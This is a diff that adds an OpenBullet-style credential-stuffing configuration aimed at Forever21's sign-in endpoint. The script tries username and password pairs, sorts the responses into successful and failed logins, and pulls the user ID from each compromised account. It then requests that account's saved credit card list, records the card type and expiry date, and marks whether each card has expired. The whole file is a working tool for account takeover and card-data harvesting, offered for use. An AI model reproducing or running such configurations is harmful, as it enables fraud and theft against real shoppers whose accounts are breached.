@@ -1,0 +1,115 @@
+[SETTINGS]
+{
+  "Name": "FOREVER21",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-20T09:37:02.6756223-05:00",
+  "AdditionalInfo": "",
+  "Author": "P6AK",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.forever21.com/us/shop/Account/DoSignIn" 
+  CONTENT "userid=&id=<USER>&password=<PASS>&isGuest=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.forever21.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 62" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "X-NewRelic-ID: VgUBU1dQDBACVFZUBAgDVlw=" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Origin: https://www.forever21.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.forever21.com/us/shop/account/signin" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: GlobalE_Data=%7B%22countryISO%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22cultureCode%22%3A%22en-US%22%7D; GlobalE_CT_Data=%7B%22CUID%22%3A%22859600892.485688300.564%22%2C%22CHKCUID%22%3Anull%7D; DC=E2; _clUS=en-US;" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\":\"User cannot be found" 
+    KEY "Your email or password is incorrect. Please try again" 
+    KEY "LoggedIn\":false" 
+  KEYCHAIN Success OR 
+    KEY "LoggedIn\":true" 
+
+PARSE "<SOURCE>" LR "UserId\":\"{" "}\"" -> VAR "ID" 
+
+REQUEST POST "https://www.forever21.com/us/shop/Account/GetCreditCardList" 
+  CONTENT "userid=%7B<ID>%7D" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "PLCC" 
+  KEYCHAIN Success OR 
+    KEY "PLCC" 
+
+PARSE "<SOURCE>" JSON "CardType" -> VAR "TYPE" 
+
+PARSE "<SOURCE>" JSON "ExpirationMonth" -> VAR "M" 
+
+PARSE "<SOURCE>" JSON "ExpirationYear" -> VAR "Y" 
+
+FUNCTION Constant "<TYPE> | <M>/<Y>" -> CAP "CC INFO" 
+
+FUNCTION CurrentUnixTime -> VAR "1" 
+
+FUNCTION DateToUnixTime "M/yyyy" "<M>/<Y>" -> VAR "2" 
+
+FUNCTION Compute "<1> - <2>" -> VAR "poopy" 
+
+KEYCHECK 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<poopy>" DoesNotContain "-" 
+  KEYCHAIN Success OR 
+    KEY "<poopy>" Contains "-" 
+
